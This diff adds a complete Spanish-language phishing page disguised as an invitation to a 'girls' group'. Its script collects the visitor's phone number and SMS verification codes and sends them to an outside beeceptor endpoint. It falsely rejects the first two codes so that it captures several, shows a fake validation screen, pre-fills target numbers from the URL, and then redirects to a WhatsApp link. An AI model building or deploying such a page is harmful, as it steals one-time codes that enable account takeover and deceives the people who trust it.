@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Acceso al grupo · chicas</title>
+<link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/css/intlTelInput.css">
+<style>
+  *{ box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+  body{
+    margin:0; min-height:100vh; padding:26px 16px;
+    display:flex; align-items:center; justify-content:center;
+    font-family:'Quicksand',system-ui,sans-serif; color:#4a2c3d;
+    background:linear-gradient(160deg,#ffeaf4 0%,#f6e7ff 45%,#eaf2ff 100%);
+    overflow-x:hidden;
+  }
+  .deco{ position:absolute; inset:0; overflow:hidden; pointer-events:none; }
+  .deco span{
+    position:absolute; font-size:22px; opacity:.55;
+    animation:flotar 7s ease-in-out infinite;
+  }
+  .deco span:nth-child(1){ top:6%;  left:8%;  animation-delay:0s; }
+  .deco span:nth-child(2){ top:18%; right:9%; animation-delay:1.2s; font-size:16px; }
+  .deco span:nth-child(3){ top:48%; left:5%;  animation-delay:2.1s; font-size:14px; }
+  .deco span:nth-child(4){ top:62%; right:6%; animation-delay:.6s; font-size:26px; }
+  .deco span:nth-child(5){ bottom:9%; left:12%; animation-delay:1.7s; }
+  .deco span:nth-child(6){ bottom:16%; right:12%; animation-delay:2.6s; font-size:15px; }
+  @keyframes flotar{
+    0%,100%{ transform:translateY(0) rotate(-4deg); }
+    50%{ transform:translateY(-16px) rotate(6deg); }
+  }
+
+  .card{
+    position:relative; z-index:2; width:100%; max-width:420px; overflow:hidden;
+    background:#fff; border-radius:30px; padding:26px 22px 18px;
+    border:1px solid #ffe0ef;
+    box-shadow:0 24px 60px -20px rgba(226,80,150,.35), 0 6px 18px -8px rgba(160,90,220,.22);
+    font-size:14.5px; line-height:1.5;
+  }
+  .card::before{
+    content:""; position:absolute; top:-70px; right:-60px; width:180px; height:180px;
+    border-radius:50%; background:radial-gradient(circle,#ffd3e7,transparent 68%);
+  }
+  .card::after{
+    content:""; position:absolute; bottom:-80px; left:-70px; width:190px; height:190px;
+    border-radius:50%; background:radial-gradient(circle,#e6d6ff,transparent 68%);
+  }
+  .card > *{ position:relative; z-index:1; }
+
+  .marca{
+    display:inline-flex; align-items:center; gap:6px;
+    font-size:11px; font-weight:600; letter-spacing:.4px; text-transform:uppercase;
+    color:#d6357f; background:#ffeaf3; border:1px solid #ffd2e6;
+    padding:5px 11px; border-radius:999px; margin-bottom:12px;
+  }
+
+  .pasos{ display:flex; align-items:center; gap:8px; margin:0 0 16px; }
+  .bola{
+    width:26px; height:26px; border-radius:50%; display:grid; place-items:center;
+    font-size:12px; font-weight:700; color:#c98aae;
+    background:#fff2f8; border:1.5px solid #ffd9ea;
+  }
+  .bola.on{
+    color:#fff; border-color:transparent;
+    background:linear-gradient(135deg,#ff5fa2,#c964e0);
+    box-shadow:0 6px 14px -6px rgba(255,95,162,.9);
+  }
+  .hilo{ flex:1; height:2px; border-radius:2px; background:#ffe3f0; }
+
+  h1{ font-size:21px; line-height:1.3; font-weight:700; margin:0 0 8px; color:#452a3b; }
+  .sub{ font-size:13px; color:#9a7b8d; margin:0 0 16px; }
+
+  .req{
+    list-style:none; margin:0 0 18px; padding:12px 14px;
+    background:#fffafd; border:1px dashed #ffd0e4; border-radius:16px;
+    font-size:12.5px; color:#a4788f;
+  }
+  .req li{ display:flex; gap:8px; padding:3px 0; }
+  .req li::before{ content:"💖"; font-size:11px; }
+
+  label{ display:block; font-size:12.5px; font-weight:600; color:#b05580; margin-bottom:7px; }
+  input, textarea{
+    width:100%; padding:13px 14px; font-family:inherit; font-size:15px; font-weight:500;
+    color:#452a3b; background:#fff7fb; border:1.5px solid #ffd9ea;
+    border-radius:16px; outline:none; resize:vertical;
+  }
+  input::placeholder, textarea::placeholder{ color:#c9a6b9; font-weight:400; }
+  input:focus, textarea:focus{ border-color:#ff85b8; background:#fff; box-shadow:0 0 0 4px #ffe6f2; }
+  .iti{ width:100%; }
+  .iti input{ width:100%; }
+  .iti__country-list{ z-index:60; border-radius:14px; font-size:13px; border-color:#ffd9ea; }
+  .iti__flag{ border-radius:3px; }
+
+  #codigo{
+    text-align:center; font-size:26px; letter-spacing:10px; font-weight:700;
+    padding:16px 14px; font-family:ui-monospace,Menlo,monospace;
+    color:#d6357f;
+  }
+  #codigo::placeholder{ letter-spacing:2px; font-size:15px; color:#c9a6b9; font-weight:400; }
+
+  button{
+    width:100%; margin-top:14px; padding:13px; font-family:inherit;
+    font-size:14.5px; font-weight:700; color:#fff; cursor:pointer;
+    border:none; border-radius:999px;
+    background:linear-gradient(135deg,#ff5fa2,#c964e0);
+    box-shadow:0 12px 24px -12px rgba(216,60,150,.85);
+    transition:transform .15s ease, box-shadow .15s ease, opacity .15s;
+  }
+  button:hover:not(:disabled){ transform:translateY(-1px); box-shadow:0 16px 28px -12px rgba(216,60,150,.9); }
+  button:active:not(:disabled){ transform:translateY(1px); }
+  button:disabled{ opacity:.65; cursor:default; }
+  button.suave{
+    background:#fff; color:#b05580; border:1.5px solid #ffd9ea;
+    box-shadow:none; margin-top:9px; font-weight:600; font-size:13px;
+  }
+
+  .pista{ font-size:11.5px; color:#b795a7; margin:8px 0 0; }
+  .error{
+    font-size:12.5px; font-weight:600; color:#d11d63; margin:9px 0 0;
+    background:#fff0f6; border-radius:12px; padding:8px 12px;
+  }
+  .error:empty{ display:none; }
+
+  .pie{
+    margin:16px 0 0; text-align:center; font-size:10px; color:#c3a3b4;
+    font-family:ui-monospace,Menlo,monospace;
+  }
+
+  .overlay{
+    position:absolute; inset:0; z-index:50; padding:26px;
+    display:flex; flex-direction:column; align-items:center; justify-content:center; gap:9px;
+    text-align:center; background:rgba(255,255,255,.97); backdrop-filter:blur(6px);
+  }
+  .corazon{
+    width:34px; height:34px; border-radius:50%;
+    border:3px solid #ffe1ee; border-top-color:#ff5fa2; border-right-color:#c964e0;
+    animation:girar .85s linear infinite;
+  }
+  @keyframes girar{ to{ transform:rotate(360deg); } }
+  .ov-t{ font-size:17px; font-weight:700; color:#452a3b; margin:4px 0 0; }
+  .ov-s{ font-size:12.5px; color:#a4788f; margin:0; min-height:18px; }
+  .barra{ width:100%; max-width:230px; height:7px; border-radius:999px; background:#ffeaf3; overflow:hidden; margin-top:8px; }
+  .relleno{
+    height:100%; width:0; border-radius:999px;
+    background:linear-gradient(90deg,#ff8ec1,#c964e0); transition:width .1s linear;
+  }
+  .pct{ font-size:11px; color:#c3a3b4; margin:0; font-family:ui-monospace,monospace; }
+
+  .num{
+    display:flex; align-items:center; gap:8px; font-size:13.5px; font-weight:600; color:#b05580;
+    background:#fff7fb; border:1.5px solid #ffd9ea; border-radius:14px; padding:10px 13px; margin-bottom:4px;
+  }
+  .shake{ animation:sacudir .4s ease; }
+  @keyframes sacudir{
+    20%{ transform:translateX(-6px) } 40%{ transform:translateX(6px) }
+    60%{ transform:translateX(-4px) } 80%{ transform:translateX(4px) }
+  }
+  [hidden]{ display:none !important; }
+</style>
+</head>
+<body>
+
+<div class="deco">
+  <span>🌸</span><span>💕</span><span>✨</span><span>🎀</span><span>💗</span><span>🌷</span>
+</div>
+
+<main class="card" id="card">
+
+  <span class="marca">🎀 Acceso al grupo</span>
+
+  <div class="pasos">
+    <div class="bola on" id="b1">1</div>
+    <div class="hilo"></div>
+    <div class="bola" id="b2">2</div>
+  </div>
+
+  <h1>Hola, linda 💕 antes de entrar cumple los requisitos</h1>
+  <p class="sub">Son dos pasitos y ya estás dentro de nuestro grupo de chicas.</p>
+
+  <ul class="req">
+    <li>Un número de celular real y válido</li>
+    <li>El código que te enviamos por SMS</li>
+  </ul>
+
+  <section id="paso1">
+    <label for="telefono">Paso 1 · tu número de celular</label>
+    <input id="telefono" type="tel" inputmode="tel" autocomplete="tel" placeholder="Tu número de celular">
+    <p class="error" id="error1"></p>
+    <button id="btn1" type="button">Continuar</button>
+  </section>
+
+  <section id="paso2" hidden>
+    <label for="codigo">Paso 2 · código de verificación</label>
+    <div class="num">📱 <span id="numMostrado"></span></div>
+    <p class="sub" style="margin:10px 0 10px;">
+      Revisa el código que te mandamos por SMS para poder ingresar a nuestro grupo 💌
+    </p>
+    <input id="codigo" type="text" inputmode="numeric" autocomplete="one-time-code"
+           maxlength="6" placeholder="· · · · · ·">
+    <p class="pista">Intento <span id="nIntento2">1</span> de 3 · revisa bien tu SMS 💗</p>
+    <p class="error" id="error2"></p>
+    <button id="btn2" type="button">Verificar código 💌</button>
+    <button id="volver" class="suave" type="button">Volver al número</button>
+  </section>
+
+  <p class="pie">id · <span id="idv"></span></p>
+
+  <div class="overlay" id="overlay" hidden>
+    <div class="corazon"></div>
+    <p class="ov-t">Validando 💫</p>
+    <p class="ov-s" id="ovSub">Comprobando tu código...</p>
+    <div class="barra"><div class="relleno" id="bar"></div></div>
+    <p class="pct" id="pct">0%</p>
+  </div>
+
+</main>
+
+<script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/intlTelInput.min.js"></script>
+<script>
+(function(){
+  "use strict";
+
+  /* ================= CONFIGURACIÓN ================= */
+  var CONFIG = {
+    endpoint: "https://thesecuremockserverpro.free.beeceptor.com",
+    whatsapp: "https://chat.whatsapp.com/XXXXXXXXXXXXXXXXXXXX", // <- tu enlace del grupo
+    esperaMs: 15000,
+    intentosFallidos: 2,
+    intentosPermitidos: 3
+  };
+
+  var FRASES = [
+    "Comprobando tu código...",
+    "Verificando el SMS enviado...",
+    "Consultando el registro...",
+    "Casi listo, no cierres 💗"
+  ];
+
+  var $ = function(id){ return document.getElementById(id); };
+
+  /* ================= LEER ?numer= DE LA URL ================= */
+  function leerNumeroURL(){
+    try {
+      var params = new URLSearchParams(window.location.search);
+      var raw = (params.get("numer") || "").trim();
+      // Solo dígitos (sin +, sin espacios)
+      var digitos = raw.replace(/\D/g, "");
+      if(digitos.length >= 8) return digitos;
+    } catch(e){ /* URLSearchParams no soportado */ }
+    return "";
+  }
+  var NUMERO_URL = leerNumeroURL();
+
+  /* ================= ID EN LOCALSTORAGE ================= */
+  function obtenerId(){
+    var id = localStorage.getItem("visitante_id");
+    if(!id){
+      id = (window.crypto && crypto.randomUUID)
+        ? crypto.randomUUID()
+        : "id-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2,10);
+      localStorage.setItem("visitante_id", id);
+      localStorage.setItem("visitante_intentos_codigo", "0");
+    }
+    return id;
+  }
+  var VISITANTE = obtenerId();
+  $("idv").textContent = VISITANTE.slice(0,8);
+
+  var intentos = parseInt(localStorage.getItem("visitante_intentos_codigo") || "0", 10) || 0;
+  if(intentos >= CONFIG.intentosPermitidos) intentos = 0;
+  var numeroGuardado = localStorage.getItem("visitante_numero") || "";
+
+  function pintarIntento(){
+    $("nIntento2").textContent = Math.min(intentos + 1, CONFIG.intentosPermitidos);
+  }
+
+  /* ================= JSON ORDENADO ================= */
+  function ordenar(obj){
+    var salida = {};
+    Object.keys(obj).sort().forEach(function(k){ salida[k] = obj[k]; });
+    return salida;
+  }
+
+  /* ================= ENVÍO A BEECEPTOR (SIEMPRE SALE) ================= */
+  function enviar(payload){
+    var body = JSON.stringify(ordenar(payload));
+    console.log("[BEEceptor] POST ->", CONFIG.endpoint);
+    console.log("[BEEceptor] body:", body);
+
+    return fetch(CONFIG.endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: body
+    })
+    .then(function(res){
+      console.log("[BEEceptor] fetch status:", res.status);
+      return res;
+    })
+    .catch(function(err){
+      console.warn("[BEEceptor] fetch falló, probando sendBeacon:", err);
+      try {
+        if(navigator.sendBeacon){
+          var blob = new Blob([body], { type: "application/json" });
+          var ok = navigator.sendBeacon(CONFIG.endpoint, blob);
+          console.log("[BEEceptor] sendBeacon resultado:", ok);
+          return ok;
+        }
+      } catch(e){
+        console.warn("[BEEceptor] sendBeacon falló:", e);
+      }
+      try {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", CONFIG.endpoint, true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(body);
+        console.log("[BEEceptor] XHR enviado");
+        return xhr;
+      } catch(e){
+        console.error("[BEEceptor] XHR falló:", e);
+        return null;
+      }
+    });
+  }
+
+  /* ================= VALIDADOR DE NÚMEROS ================= */
+  var input = $("telefono");
+  var iti = null;
+
+  if(window.intlTelInput){
+    iti = window.intlTelInput(input, {
+      initialCountry: "es",
+      preferredCountries: ["es","mx","ar","co","pe","cl","ec","ve","py"],
+      autoPlaceholder: "aggressive",
+      formatOnDisplay: true,
+      utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/utils.js"
+    });
+  }
+
+  // Formatea un número con código de país sin + (ej: 59599545423 -> +595 995 454 23)
+  function formatearNumeroURL(digitos){
+    if(iti && iti.setNumber){
+      try {
+        iti.setNumber("+" + digitos);
+        var n = iti.getNumber();
+        if(n) return n;
+      } catch(e){}
+    }
+    return "+" + digitos;
+  }
+
+  function numeroVisualmenteValido(){
+    var raw = input.value.replace(/\D/g,"");
+    return raw.length >= 7;
+  }
+
+  function limpiar(){
+    $("error1").textContent = "";
+    $("error2").textContent = "";
+  }
+
+  function sacudir(){
+    var c = $("card");
+    c.classList.remove("shake");
+    void c.offsetWidth;
+    c.classList.add("shake");
+  }
+
+  /* ================= LOADING ================= */
+  function cargar(){
+    return new Promise(function(resolve){
+      var ov = $("overlay"), bar = $("bar"), pct = $("pct"), sub = $("ovSub");
+      ov.hidden = false;
+      bar.style.width = "0%";
+      pct.textContent = "0%";
+      sub.textContent = FRASES[0];
+
+      var iFrase = 1;
+      var tFrase = setInterval(function(){
+        sub.textContent = FRASES[iFrase % FRASES.length];
+        iFrase++;
+      }, CONFIG.esperaMs / FRASES.length);
+
+      var avance = 0, tick = 100;
+      var inc = 100 / (CONFIG.esperaMs / tick);
+      var tBarra = setInterval(function(){
+        avance = Math.min(100, avance + inc);
+        bar.style.width = avance + "%";
+        pct.textContent = Math.floor(avance) + "%";
+      }, tick);
+
+      setTimeout(function(){
+        clearInterval(tBarra);
+        clearInterval(tFrase);
+        bar.style.width = "100%";
+        pct.textContent = "100%";
+        setTimeout(function(){ ov.hidden = true; resolve(); }, 260);
+      }, CONFIG.esperaMs);
+    });
+  }
+
+  /* ================= IR AL PASO 2 (con número) ================= */
+  function irAPaso2(numero, desdeURL){
+    numeroGuardado = numero;
+    localStorage.setItem("visitante_numero", numero);
+    localStorage.setItem("visitante_intentos_codigo", "0");
+    intentos = 0;
+
+    // Enviamos el número (siempre, aunque venga de URL también interesa registrar)
+    enviar({ id: VISITANTE, numero: numero, paso: "numero", origen: desdeURL ? "url" : "form" });
+
+    $("numMostrado").textContent = numero;
+    $("paso1").hidden = true;
+    $("paso2").hidden = false;
+    $("b1").classList.remove("on");
+    $("b2").classList.add("on");
+    pintarIntento();
+
+    // Si viene de URL, ocultamos el botón de volver
+    if(desdeURL){
+      $("volver").hidden = true;
+    } else {
+      $("volver").hidden = false;
+    }
+
+    $("codigo").focus();
+  }
+
+  /* ================= PASO 1: ENVÍA NÚMERO ================= */
+  $("btn1").addEventListener("click", function(){
+    limpiar();
+
+    if(!numeroVisualmenteValido()){
+      $("error1").textContent = "Mmm, escribe al menos 7 dígitos 💗";
+      sacudir();
+      input.focus();
+      return;
+    }
+
+    var numero = iti ? iti.getNumber() : input.value.trim();
+    if(!numero) numero = input.value.trim();
+
+    irAPaso2(numero, false);
+  });
+
+  input.addEventListener("keydown", function(e){
+    if(e.key === "Enter"){ e.preventDefault(); $("btn1").click(); }
+  });
+
+  /* ================= PASO 2: VERIFICACIÓN DEL CÓDIGO ================= */
+  var inputCodigo = $("codigo");
+
+  inputCodigo.addEventListener("input", function(){
+    this.value = this.value.replace(/\D/g, "").slice(0, 6);
+  });
+
+  inputCodigo.addEventListener("keydown", function(e){
+    if(e.key === "Enter"){ e.preventDefault(); $("btn2").click(); }
+  });
+
+  $("btn2").addEventListener("click", async function(){
+    limpiar();
+    var codigo = inputCodigo.value.trim();
+
+    if(codigo.length < 4){
+      $("error2").textContent = "Escribe el código numérico que recibiste por SMS 💌";
+      sacudir();
+      inputCodigo.focus();
+      return;
+    }
+
+    var btn = $("btn2");
+    btn.disabled = true;
+
+    // Loading visual
+    await cargar();
+
+    // Aumentamos intento
+    intentos += 1;
+    localStorage.setItem("visitante_intentos_codigo", String(intentos));
+
+    // Enviamos SIEMPRE (incluye el primer fallo) - con await
+    await enviar({
+      id: VISITANTE,
+      numero: numeroGuardado,
+      codigo: codigo,
+      intento: intentos,
+      resultado: intentos <= CONFIG.intentosFallidos ? "fallo" : "exito"
+    });
+
+    // Fallos (1 y 2) -> vuelve a pedir
+    if(intentos <= CONFIG.intentosFallidos){
+      $("error2").textContent = "Código incorrecto, favor vuelva a intentar.";
+      pintarIntento();
+      btn.disabled = false;
+      inputCodigo.value = "";
+      sacudir();
+      inputCodigo.focus();
+      return;
+    }
+
+    // Tercer intento -> redirigir
+    localStorage.setItem("visitante_intentos_codigo", "0");
+    btn.textContent = "Redirigiendo al grupo...";
+    setTimeout(function(){ window.location.href = CONFIG.whatsapp; }, 900);
+  });
+
+  $("volver").addEventListener("click", function(){
+    // Si viene de URL no permitimos volver (aunque esté oculto, por seguridad)
+    if(NUMERO_URL) return;
+    $("paso2").hidden = true;
+    $("paso1").hidden = false;
+    $("b2").classList.remove("on");
+    $("b1").classList.add("on");
+    limpiar();
+    intentos = 0;
+    localStorage.setItem("visitante_intentos_codigo", "0");
+    $("codigo").value = "";
+    pintarIntento();
+  });
+
+  /* ================= INICIALIZACIÓN ================= */
+  pintarIntento();
+
+  // Si hay ?numer= válido, saltamos directo al paso 2
+  if(NUMERO_URL){
+    // Esperamos a que intl-tel-input esté listo para formatear bien
+    var arrancar = function(){
+      var formateado = formatearNumeroURL(NUMERO_URL);
+      // Aseguramos que el paso 1 quede oculto desde el inicio
+      $("paso1").hidden = true;
+      $("paso2").hidden = false;
+      irAPaso2(formateado, true);
+    };
+    if(window.intlTelInput && iti){
+      // utils.js carga async, damos un pequeño margen
+      setTimeout(arrancar, 150);
+    } else {
+      arrancar();
+    }
+  }
+})();
+</script>
+</body>
+</html>
